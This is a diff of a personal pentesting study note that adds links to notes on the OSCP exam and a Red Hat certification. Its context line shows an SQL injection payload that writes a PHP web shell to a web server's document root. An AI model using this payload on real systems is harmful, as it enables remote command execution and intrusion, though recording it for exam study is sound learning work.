@@ -8,6 +8,8 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221009001740](/zet/20221009001740/README.md) OSCP exam
+- [20221009001455](/zet/20221009001455/README.md) RHCSE Red Hat Certified System Administrator
 - [20221008213122](/zet/20221008213122/README.md) version
 - [20221008195148](/zet/20221008195148/README.md) seclists etc files project
 - [20221008215655](/zet/20221008215655/README.md) user account
